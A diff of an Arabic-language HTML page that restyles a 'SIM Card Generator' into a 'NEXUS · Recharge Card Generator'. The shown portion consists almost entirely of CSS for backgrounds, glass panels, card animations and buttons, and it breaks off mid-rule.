@@ -1,2382 +1,2071 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>SIM Card Generator · Luxury Edition</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <title>NEXUS · Recharge Card Generator</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
-        /* ============================================================
-           RESET · BASE
-           ============================================================ */
-        *,
-        *::before,
-        *::after {
+        /* ═══════════════════════════════════════════════════════════════════
+           RESET & BASE
+           ═══════════════════════════════════════════════════════════════════ */
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         :root {
-            --bg-deep: #06080f;
-            --bg-mid: #0b0f1a;
-            --gold: #c9a84c;
-            --gold-light: #e8d5a3;
-            --gold-dark: #a8873a;
-            --silver: #a8b4c8;
-            --text-primary: #f0ece6;
-            --text-secondary: rgba(255, 255, 255, 0.45);
-            --shadow-glow: rgba(201, 168, 76, 0.06);
-            --radius-xl: 48px;
-            --radius-lg: 24px;
-            --radius-md: 16px;
-            --transition-bounce: cubic-bezier(0.34, 1.56, 0.64, 1);
-            --transition-smooth: cubic-bezier(0.23, 1, 0.32, 1);
-            --transition-slow: cubic-bezier(0.6, 0, 0.4, 1);
+            --radius-sm: 14px;
+            --radius-md: 22px;
+            --radius-lg: 32px;
+            --radius-xl: 44px;
+            --glass-bg: rgba(255, 255, 255, 0.035);
+            --glass-border: rgba(255, 255, 255, 0.06);
+            --text-primary: #f0f4ff;
+            --text-secondary: rgba(255, 255, 255, 0.5);
+            --text-tertiary: rgba(255, 255, 255, 0.2);
+            --shadow-xl: 0 40px 100px rgba(0, 0, 0, 0.6);
+            --transition: 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            --font: 'Cairo', 'Inter', -apple-system, sans-serif;
+            --btn-color: #ffd700;
+            --btn-glow: rgba(255, 215, 0, 0.15);
         }
-
-        html {
-            font-size: 16px;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
+        html,
         body {
-            font-family: 'Cairo', 'Segoe UI', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 12px;
-            background: var(--bg-deep);
-            color: var(--text-primary);
-            position: relative;
-            overflow-x: hidden;
-            overflow-y: auto;
-        }
-
-        /* ============================================================
-           BG · ATMOSPHERE
-           ============================================================ */
-        #bg-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
+            min-height: 100vh;
+            background: #06080f;
+            color: var(--text-primary);
+            font-family: var(--font);
+            overflow: hidden;
+            overscroll-behavior: none;
+            -webkit-font-smoothing: antialiased;
+            user-select: none;
+        }
+        #app {
+            position: fixed;
+            inset: 0;
+            background: #06080f;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .bg-orb {
+        /* ═══════════════════════════════════════════════════════════════════
+           BACKGROUND LAYERS
+           ═══════════════════════════════════════════════════════════════════ */
+        .bg-layer {
             position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .bg-layer .orb {
+            position: absolute;
             border-radius: 50%;
             filter: blur(100px);
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.15;
-            animation: orbDrift 24s ease-in-out infinite alternate;
+            opacity: 0.2;
+            animation: orbFloat 25s ease-in-out infinite alternate;
         }
-        .bg-orb--1 {
-            width: 70vmax;
-            height: 70vmax;
+        .bg-layer .orb:nth-child(1) {
+            width: 500px;
+            height: 500px;
             top: -15%;
-            right: -20%;
-            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.06), transparent 70%);
-            animation-duration: 30s;
+            left: -10%;
+            background: radial-gradient(circle, #ffd70033, transparent 70%);
+            animation-duration: 28s;
         }
-        .bg-orb--2 {
-            width: 50vmax;
-            height: 50vmax;
-            bottom: -15%;
-            left: -15%;
-            background: radial-gradient(ellipse, rgba(80, 60, 180, 0.04), transparent 60%);
-            animation-duration: 26s;
-            animation-delay: 4s;
+        .bg-layer .orb:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            bottom: -20%;
+            right: -10%;
+            background: radial-gradient(circle, #ff8c0033, transparent 70%);
+            animation-duration: 32s;
+            animation-delay: -8s;
         }
-        .bg-orb--3 {
-            width: 40vmax;
-            height: 40vmax;
+        .bg-layer .orb:nth-child(3) {
+            width: 350px;
+            height: 350px;
             top: 40%;
             left: 50%;
             transform: translateX(-50%);
-            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.02), transparent 50%);
-            animation-duration: 34s;
-            animation-delay: 8s;
+            background: radial-gradient(circle, #ff450022, transparent 70%);
+            animation-duration: 20s;
+            animation-delay: -4s;
         }
-
-        @keyframes orbDrift {
+        @keyframes orbFloat {
             0% {
                 transform: translate(0, 0) scale(1);
             }
-            33% {
-                transform: translate(3%, -2%) scale(1.05);
-            }
-            66% {
-                transform: translate(-2%, 3%) scale(0.95);
-            }
             100% {
-                transform: translate(2%, -3%) scale(1.02);
+                transform: translate(50px, -60px) scale(1.15);
             }
         }
-
-        .bg-grain {
-            position: fixed;
+        .bg-layer .grid-dots {
+            position: absolute;
             inset: 0;
-            z-index: 0;
-            pointer-events: none;
-            opacity: 0.012;
-            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
-            background-size: 256px 256px;
-            animation: grainMove 0.6s steps(3) infinite;
+            background-image: radial-gradient(circle, rgba(255, 215, 0, 0.025) 1px, transparent 1px);
+            background-size: 48px 48px;
+            animation: dotsDrift 35s linear infinite;
         }
-
-        @keyframes grainMove {
+        @keyframes dotsDrift {
             0% {
                 transform: translate(0, 0);
             }
             100% {
-                transform: translate(3px, 3px);
+                transform: translate(48px, 48px);
             }
         }
 
-        /* ============================================================
-           WRAPPER
-           ============================================================ */
-        .app-wrapper {
+        /* ═══════════════════════════════════════════════════════════════════
+           MAIN CONTAINER
+           ═══════════════════════════════════════════════════════════════════ */
+        .app-container {
             position: relative;
-            z-index: 10;
+            z-index: 1;
             width: 100%;
-            max-width: 880px;
-            margin: 0 auto;
-            padding: 12px 0 30px;
-        }
-
-        /* ============================================================
-           HEADER
-           ============================================================ */
-        .app-header {
+            max-width: 580px;
+            padding: 14px;
+            height: 100vh;
             display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 8px 28px 8px;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-
-        .app-header .brand {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        .app-header .brand-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, rgba(201, 168, 76, 0.06), rgba(201, 168, 76, 0.01));
-            border: 1px solid rgba(201, 168, 76, 0.04);
-            display: flex;
-            align-items: center;
+            flex-direction: column;
             justify-content: center;
-            font-size: 22px;
-            color: var(--gold);
-            position: relative;
-            backdrop-filter: blur(12px);
-            box-shadow: 0 0 60px rgba(201, 168, 76, 0.02);
         }
 
-        .app-header .brand-icon::after {
-            content: '';
-            position: absolute;
-            inset: -4px;
-            border-radius: 50%;
-            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.04), transparent 60%);
-            filter: blur(16px);
-            animation: iconGlow 3s ease-in-out infinite alternate;
-            pointer-events: none;
+        /* ═══════════════════════════════════════════════════════════════════
+           HEADER
+           ═══════════════════════════════════════════════════════════════════ */
+        .header {
+            text-align: center;
+            margin-bottom: 16px;
+            padding: 0 6px;
         }
-
-        @keyframes iconGlow {
-            0% {
-                opacity: 0.3;
-                transform: scale(0.7);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1.4);
-            }
+        .header .badge {
+            display: inline-block;
+            font-size: 9px;
+            letter-spacing: 0.3em;
+            text-transform: uppercase;
+            color: var(--text-tertiary);
+            background: var(--glass-bg);
+            padding: 4px 16px;
+            border-radius: 40px;
+            border: 1px solid var(--glass-border);
+            margin-bottom: 4px;
+            font-weight: 500;
         }
-
-        .app-header .brand-text {
-            font-size: 26px;
+        .header h1 {
+            font-size: clamp(28px, 6.5vw, 42px);
             font-weight: 900;
-            letter-spacing: 1.5px;
-            background: linear-gradient(135deg, #f0ece6, #e8d5a3, #c9a84c, #e8d5a3);
+            letter-spacing: -0.01em;
+            background: linear-gradient(135deg, #ffd700 0%, #ff8c00 40%, #ff4500 80%, #ffd700 100%);
             background-size: 300% 300%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            animation: shimmerText 7s ease-in-out infinite;
+            background-clip: text;
+            animation: gradShift 6s ease-in-out infinite alternate;
+            line-height: 1.1;
         }
-
-        @keyframes shimmerText {
-            0%,
-            100% {
+        @keyframes gradShift {
+            0% {
                 background-position: 0% 50%;
             }
-            50% {
+            100% {
                 background-position: 100% 50%;
             }
         }
-
-        .app-header .header-actions {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        /* ============================================================
-           SHUFFLE BUTTON · PREMIUM
-           ============================================================ */
-        .btn-shuffle {
-            position: relative;
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.04);
+        .header p {
             color: var(--text-secondary);
-            font-weight: 700;
-            padding: 12px 24px;
-            border-radius: 60px;
-            font-size: 14px;
-            cursor: pointer;
-            font-family: 'Cairo', sans-serif;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: all 0.5s var(--transition-bounce);
-            backdrop-filter: blur(12px);
-            letter-spacing: 0.5px;
-            overflow: hidden;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
+            font-size: 13px;
+            font-weight: 300;
+            letter-spacing: 0.04em;
+            margin-top: 2px;
         }
 
-        .btn-shuffle::before {
+        /* ═══════════════════════════════════════════════════════════════════
+           PANEL — Glass Core
+           ═══════════════════════════════════════════════════════════════════ */
+        .panel {
+            position: relative;
+            background: var(--glass-bg);
+            backdrop-filter: blur(40px) saturate(1.3);
+            -webkit-backdrop-filter: blur(40px) saturate(1.3);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-lg);
+            padding: 24px 20px;
+            box-shadow: var(--shadow-xl), inset 0 1px 0 rgba(255, 255, 255, 0.02);
+            flex: 0 1 auto;
+            min-height: 340px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .panel::before {
             content: '';
             position: absolute;
             inset: 0;
-            border-radius: 60px;
+            border-radius: var(--radius-lg);
             padding: 1px;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), transparent 40%, transparent 60%, rgba(255, 255, 255, 0.01));
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.04), transparent 50%, rgba(255, 215, 0, 0.02));
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
             pointer-events: none;
         }
-
-        .btn-shuffle:hover:not(:disabled) {
-            background: rgba(201, 168, 76, 0.04);
-            border-color: rgba(201, 168, 76, 0.06);
-            color: var(--gold-light);
-            transform: translateY(-2px);
-            box-shadow: 0 12px 50px rgba(201, 168, 76, 0.02);
-        }
-
-        .btn-shuffle:active:not(:disabled) {
-            transform: scale(0.94);
-            transition-duration: 0.15s;
-        }
-
-        .btn-shuffle:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        .btn-shuffle .shuffle-icon {
-            font-size: 16px;
-            transition: transform 0.8s var(--transition-bounce);
-        }
-
-        .btn-shuffle:hover .shuffle-icon {
-            transform: rotate(180deg);
-        }
-
-        .btn-shuffle .shuffle-spinner {
-            display: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(201, 168, 76, 0.05);
-            border-top: 2px solid var(--gold-light);
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-
-        .btn-shuffle.loading .shuffle-spinner {
-            display: inline-block;
-        }
-        .btn-shuffle.loading .shuffle-icon {
-            display: none;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* ============================================================
-           STEP INDICATOR
-           ============================================================ */
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 4px;
-            margin-bottom: 30px;
-            position: relative;
-            padding: 0 10px;
-        }
-
-        .step-indicator::before {
-            content: '';
+        .panel .glow-aura {
             position: absolute;
-            top: 50%;
-            left: 15%;
-            right: 15%;
-            height: 1px;
-            background: rgba(255, 255, 255, 0.02);
-            transform: translateY(-50%);
-            border-radius: 1px;
-            z-index: 0;
-        }
-
-        .step-dot {
-            position: relative;
-            z-index: 1;
-            width: 38px;
-            height: 38px;
+            top: -30%;
+            right: -20%;
+            width: 250px;
+            height: 250px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.01);
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.08);
-            transition: all 0.7s var(--transition-bounce);
-            backdrop-filter: blur(6px);
-            cursor: default;
-        }
-
-        .step-dot .dot-ring {
-            position: absolute;
-            inset: -3px;
-            border-radius: 50%;
-            border: 1.5px solid transparent;
-            transition: all 0.8s var(--transition-smooth);
             pointer-events: none;
+            transition: all 1.5s ease;
+            opacity: 0.2;
+            filter: blur(60px);
+            background: radial-gradient(circle, #ffd70033, transparent 70%);
         }
 
-        .step-dot.active {
-            background: linear-gradient(135deg, rgba(201, 168, 76, 0.08), rgba(201, 168, 76, 0.01));
-            border-color: rgba(201, 168, 76, 0.06);
-            color: var(--gold-light);
-            transform: scale(1.06);
-        }
-
-        .step-dot.active .dot-ring {
-            border-color: rgba(201, 168, 76, 0.06);
-        }
-
-        .step-dot.completed {
-            background: rgba(201, 168, 76, 0.02);
-            border-color: rgba(201, 168, 76, 0.03);
-            color: var(--gold);
-        }
-
-        .step-line {
-            position: relative;
-            z-index: 0;
+        /* ═══════════════════════════════════════════════════════════════════
+           PAGES
+           ═══════════════════════════════════════════════════════════════════ */
+        .page {
+            display: none;
+            flex-direction: column;
             flex: 1;
-            max-width: 36px;
-            height: 1px;
-            background: rgba(255, 255, 255, 0.015);
-            border-radius: 1px;
-            transition: background 0.8s var(--transition-smooth);
+            animation: pageIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
         }
-
-        .step-line.active {
-            background: linear-gradient(90deg, rgba(201, 168, 76, 0.1), rgba(201, 168, 76, 0.02));
-        }
-
-        /* ============================================================
-           CARD GRID
-           ============================================================ */
-        .cards-stage {
-            position: relative;
-            min-height: 420px;
-            padding: 4px 0;
-        }
-
-        .cards-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
-            gap: 20px;
-            justify-items: center;
-            padding: 6px 0;
-        }
-
-        /* ============================================================
-           SIM CARD · 3D LUXURY
-           ============================================================ */
-        .sim-card-wrap {
-            perspective: 1200px;
-            width: 100%;
-            max-width: 200px;
-            aspect-ratio: 3/4.2;
-            cursor: pointer;
-            position: relative;
-            transition: transform 0.6s var(--transition-bounce);
-        }
-
-        .sim-card-wrap:hover {
-            transform: translateY(-6px) scale(1.02);
-        }
-
-        .sim-card {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            transform-style: preserve-3d;
-            transition: transform 0.8s var(--transition-bounce);
-            border-radius: var(--radius-lg);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
-        }
-
-        .sim-card.flipped {
-            transform: rotateY(180deg);
-        }
-
-        .sim-card-face {
-            position: absolute;
-            inset: 0;
-            border-radius: var(--radius-lg);
-            backface-visibility: hidden;
-            overflow: hidden;
+        .page.active {
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 18px 14px;
-            background: rgba(255, 255, 255, 0.015);
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(20px) saturate(1.2);
-            -webkit-backdrop-filter: blur(20px) saturate(1.2);
         }
-
-        /* --- FRONT --- */
-        .sim-card-front {
-            z-index: 2;
-            transform: rotateY(0deg);
-        }
-
-        /* --- BACK --- */
-        .sim-card-back {
-            transform: rotateY(180deg);
-            background: rgba(10, 8, 16, 0.85);
-            backdrop-filter: blur(24px);
-            border: 1px solid rgba(201, 168, 76, 0.04);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            text-align: center;
-        }
-
-        .sim-card-back .back-flag {
-            font-size: 48px;
-            line-height: 1;
-            filter: drop-shadow(0 4px 20px rgba(0, 0, 0, 0.3));
-        }
-
-        .sim-card-back .back-name {
-            font-size: 22px;
-            font-weight: 800;
-            color: var(--text-primary);
-            letter-spacing: 1px;
-        }
-
-        .sim-card-back .back-prefix {
-            font-size: 13px;
-            color: var(--text-secondary);
-            font-weight: 300;
-            letter-spacing: 2px;
-        }
-
-        .sim-card-back .back-select {
-            margin-top: 8px;
-            padding: 8px 24px;
-            border-radius: 60px;
-            border: 1px solid rgba(201, 168, 76, 0.06);
-            background: rgba(201, 168, 76, 0.02);
-            color: var(--gold-light);
-            font-size: 13px;
-            font-weight: 700;
-            font-family: 'Cairo', sans-serif;
-            cursor: pointer;
-            transition: all 0.4s ease;
-        }
-
-        .sim-card-back .back-select:hover {
-            background: rgba(201, 168, 76, 0.04);
-            border-color: rgba(201, 168, 76, 0.08);
-            transform: scale(1.02);
-        }
-
-        /* --- CARD GLASS LAYERS --- */
-        .sim-card .card-shine {
-            position: absolute;
-            inset: 0;
-            border-radius: var(--radius-lg);
-            pointer-events: none;
-            z-index: 1;
-            background: radial-gradient(ellipse at 30% 20%, rgba(255, 255, 255, 0.02), transparent 50%);
-            animation: shineFloat 8s ease-in-out infinite alternate;
-        }
-
-        @keyframes shineFloat {
-            0% {
-                transform: translate(0, 0) rotate(0deg);
-                opacity: 0.4;
-            }
-            100% {
-                transform: translate(6%, 4%) rotate(3deg);
-                opacity: 0.8;
-            }
-        }
-
-        .sim-card .card-border-glow {
-            position: absolute;
-            inset: -1px;
-            border-radius: var(--radius-lg);
-            pointer-events: none;
-            z-index: 0;
-            background: radial-gradient(ellipse at 50% 0%, var(--card-glow, rgba(201, 168, 76, 0.02)), transparent 60%);
-            opacity: 0.3;
-            animation: borderPulse 4s ease-in-out infinite alternate;
-        }
-
-        @keyframes borderPulse {
-            0% {
-                opacity: 0.2;
-            }
-            100% {
-                opacity: 0.6;
-            }
-        }
-
-        .sim-card .card-material {
-            position: absolute;
-            inset: 2px;
-            border-radius: calc(var(--radius-lg) - 2px);
-            pointer-events: none;
-            z-index: 0;
-            background: var(--card-material-bg, rgba(255, 255, 255, 0.01));
-        }
-
-        /* --- CARD CONTENT --- */
-        .sim-card .card-rarity {
-            position: absolute;
-            top: 10px;
-            right: 12px;
-            font-size: 9px;
-            font-weight: 800;
-            letter-spacing: 2px;
-            color: var(--rarity-color, rgba(255, 255, 255, 0.08));
-            text-transform: uppercase;
-            z-index: 3;
-            opacity: 0.5;
-            transition: opacity 0.4s ease;
-        }
-
-        .sim-card-wrap:hover .card-rarity {
-            opacity: 1;
-        }
-
-        .sim-card .card-icon {
-            font-size: 40px;
-            color: var(--card-icon-color, rgba(255, 255, 255, 0.04));
-            margin-bottom: 6px;
-            filter: drop-shadow(0 4px 30px rgba(0, 0, 0, 0.2));
-            z-index: 3;
-            transition: all 0.6s var(--transition-bounce);
-        }
-
-        .sim-card-wrap:hover .card-icon {
-            transform: scale(1.04) rotate(-2deg);
-            color: var(--card-icon-hover, var(--gold-light));
-        }
-
-        .sim-card .card-name {
-            font-size: 16px;
-            font-weight: 800;
-            color: var(--text-primary);
-            z-index: 3;
-            letter-spacing: 0.5px;
-            text-align: center;
-        }
-
-        .sim-card .card-sub {
-            font-size: 10px;
-            color: var(--text-secondary);
-            font-weight: 300;
-            z-index: 3;
-            letter-spacing: 3px;
-            margin-top: 2px;
-            opacity: 0.4;
-        }
-
-        .sim-card .card-engrave {
-            position: absolute;
-            bottom: 12px;
-            right: 14px;
-            font-size: 7px;
-            color: rgba(255, 255, 255, 0.02);
-            letter-spacing: 4px;
-            font-weight: 300;
-            z-index: 3;
-            text-transform: uppercase;
-            pointer-events: none;
-            font-family: 'Cairo', monospace;
-        }
-
-        .sim-card .card-particles {
-            position: absolute;
-            inset: 0;
-            pointer-events: none;
-            z-index: 1;
-            overflow: hidden;
-            border-radius: var(--radius-lg);
-        }
-
-        .sim-card .card-particles .p {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            border-radius: 50%;
-            background: var(--gold);
-            opacity: 0;
-            animation: particleFloat 4s ease-in-out infinite;
-        }
-
-        @keyframes particleFloat {
+        @keyframes pageIn {
             0% {
                 opacity: 0;
-                transform: translate(0, 0) scale(0);
-            }
-            20% {
-                opacity: 0.3;
-            }
-            80% {
-                opacity: 0.3;
-            }
-            100% {
-                opacity: 0;
-                transform: translate(var(--px, 20px), var(--py, -30px)) scale(1);
-            }
-        }
-
-        /* --- CARD HOLOGRAM --- */
-        .sim-card .card-holo {
-            position: absolute;
-            inset: 0;
-            border-radius: var(--radius-lg);
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.06;
-            background: conic-gradient(from var(--holo-angle, 0deg),
-                    transparent,
-                    rgba(201, 168, 76, 0.02),
-                    transparent 30%,
-                    rgba(255, 255, 255, 0.01),
-                    transparent 60%,
-                    rgba(201, 168, 76, 0.015),
-                    transparent 80%,
-                    transparent);
-            animation: holoRotate 12s linear infinite;
-            mix-blend-mode: overlay;
-        }
-
-        @keyframes holoRotate {
-            from {
-                --holo-angle: 0deg;
-            }
-            to {
-                --holo-angle: 360deg;
-            }
-        }
-
-        /* ============================================================
-           CARD ENTER ANIMATION
-           ============================================================ */
-        .sim-card-wrap.entering {
-            animation: cardEnter 0.9s var(--transition-bounce) forwards;
-        }
-
-        @keyframes cardEnter {
-            0% {
-                opacity: 0;
-                transform: translateY(40px) scale(0.6) rotateX(10deg);
-                filter: blur(8px);
-            }
-            60% {
-                opacity: 1;
-                transform: translateY(-4px) scale(1.02) rotateX(0deg);
-                filter: blur(0);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0) scale(1) rotateX(0deg);
-                filter: blur(0);
-            }
-        }
-
-        .sim-card-wrap.exiting {
-            animation: cardExit 0.6s var(--transition-smooth) forwards;
-        }
-
-        @keyframes cardExit {
-            0% {
-                opacity: 1;
-                transform: translateY(0) scale(1) rotateY(0deg);
-            }
-            100% {
-                opacity: 0;
-                transform: translateY(-60px) scale(0.3) rotateY(60deg);
-                filter: blur(12px);
-            }
-        }
-
-        /* ============================================================
-           STEP 2 · CLAIM
-           ============================================================ */
-        .claim-area {
-            display: none;
-            animation: stepEnter 0.7s var(--transition-bounce) forwards;
-        }
-
-        .claim-area.active {
-            display: block;
-        }
-
-        @keyframes stepEnter {
-            0% {
-                opacity: 0;
-                transform: translateY(30px) scale(0.96);
+                transform: translateY(20px) scale(0.97);
             }
             100% {
                 opacity: 1;
                 transform: translateY(0) scale(1);
             }
         }
-
-        .claim-area .step-title {
-            font-size: 26px;
-            font-weight: 800;
-            margin-bottom: 2px;
-            color: var(--text-primary);
-            text-align: center;
-        }
-
-        .claim-area .step-title .highlight {
-            background: linear-gradient(135deg, #e8d5a3, #c9a84c, #a8873a);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .claim-area .step-desc {
-            text-align: center;
-            color: var(--text-secondary);
-            font-size: 14px;
-            font-weight: 300;
-            margin-bottom: 22px;
-        }
-
-        .gift-panel {
-            position: relative;
-            background: rgba(255, 255, 255, 0.01);
-            border-radius: var(--radius-lg);
-            padding: 20px 22px 18px;
-            margin: 0 0 18px;
-            border: 1px solid rgba(255, 255, 255, 0.02);
-            overflow: hidden;
-        }
-
-        .gift-panel::before {
-            content: '';
-            position: absolute;
-            top: -30%;
-            right: -20%;
-            width: 50%;
-            height: 160%;
-            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.01), transparent 60%);
-            pointer-events: none;
-        }
-
-        .gift-panel .gift-top {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 14px;
-            margin-bottom: 12px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .gift-panel .gift-box-3d {
-            font-size: 36px;
-            color: var(--gold);
-            animation: giftFloat 3.6s ease-in-out infinite;
-            filter: drop-shadow(0 8px 40px rgba(201, 168, 76, 0.02));
-            position: relative;
-        }
-
-        @keyframes giftFloat {
-            0%,
-            100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
-        }
-
-        .gift-panel .gift-title {
-            font-size: 18px;
+        .page .page-title {
+            font-size: 20px;
             font-weight: 700;
-            color: var(--text-primary);
+            margin-bottom: 10px;
+            letter-spacing: -0.01em;
+        }
+        .page .page-title .accent {
+            color: var(--btn-color, #ffd700);
+        }
+        .page .page-sub {
+            font-size: 12px;
+            color: var(--text-tertiary);
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            font-weight: 400;
+            margin-bottom: 2px;
         }
 
-        .gift-panel ul {
-            list-style: none;
-            padding: 0;
-            margin: 2px 0 0;
-            text-align: right;
-            position: relative;
-            z-index: 1;
-        }
-
-        .gift-panel ul li {
-            padding: 7px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.01);
-            color: rgba(220, 210, 200, 0.65);
-            font-size: 13px;
+        /* ─── Back Row ─── */
+        .back-row {
             display: flex;
             align-items: center;
-            justify-content: flex-end;
-            gap: 14px;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .back-btn {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 40px;
+            padding: 4px 12px;
+            color: var(--text-secondary);
+            font-size: 11px;
+            font-weight: 400;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .back-btn:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: #fff;
+            transform: translateX(4px);
+        }
+        .back-btn svg {
+            width: 14px;
+            height: 14px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .back-row .label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-right: auto;
             font-weight: 400;
         }
 
-        .gift-panel ul li:last-child {
-            border-bottom: none;
+        /* ─── Grids ─── */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
         }
 
-        .gift-panel ul li i {
-            color: var(--gold);
-            font-size: 16px;
-            width: 22px;
-            text-align: center;
-            opacity: 0.5;
-        }
-
-        .gift-panel .gift-note {
-            color: var(--text-secondary);
-            font-size: 12px;
-            margin-top: 12px;
-            text-align: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.01);
-            padding-top: 12px;
-            position: relative;
-            z-index: 1;
-            opacity: 0.5;
-        }
-
-        .gift-panel .gift-note strong {
-            color: var(--gold);
-            font-weight: 700;
-            opacity: 1;
-        }
-
-        .input-group {
-            margin: 14px 0 16px;
-            text-align: right;
-            position: relative;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-bottom: 5px;
-            font-weight: 700;
-            opacity: 0.6;
-            letter-spacing: 0.5px;
-        }
-
-        .input-group label i {
-            color: var(--gold);
-            margin-left: 10px;
-            opacity: 0.4;
-        }
-
-        .input-group .input-wrap {
-            position: relative;
-            border-radius: 60px;
-            background: rgba(0, 0, 0, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.02);
-            transition: all 0.5s var(--transition-smooth);
-            overflow: hidden;
-        }
-
-        .input-group .input-wrap:focus-within {
-            border-color: rgba(201, 168, 76, 0.04);
-            box-shadow: 0 0 0 6px rgba(201, 168, 76, 0.005);
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 16px 22px;
-            border: none;
-            background: transparent;
-            color: var(--text-primary);
-            font-size: 18px;
-            outline: none;
-            font-family: 'Cairo', sans-serif;
-            text-align: right;
-            letter-spacing: 0.5px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.04);
-            font-size: 15px;
-            font-weight: 300;
-        }
-
-        .btn-premium {
-            position: relative;
-            background: linear-gradient(135deg, rgba(201, 168, 76, 0.03), rgba(201, 168, 76, 0.005));
-            border: 1px solid rgba(201, 168, 76, 0.03);
-            color: var(--gold-light);
-            font-weight: 800;
-            padding: 18px 26px;
-            border-radius: 60px;
-            font-size: 20px;
-            width: 100%;
+        /* ─── Buttons ─── */
+        .btn {
+            border: 0;
+            border-radius: var(--radius-sm);
+            padding: 12px 8px;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.6s var(--transition-bounce);
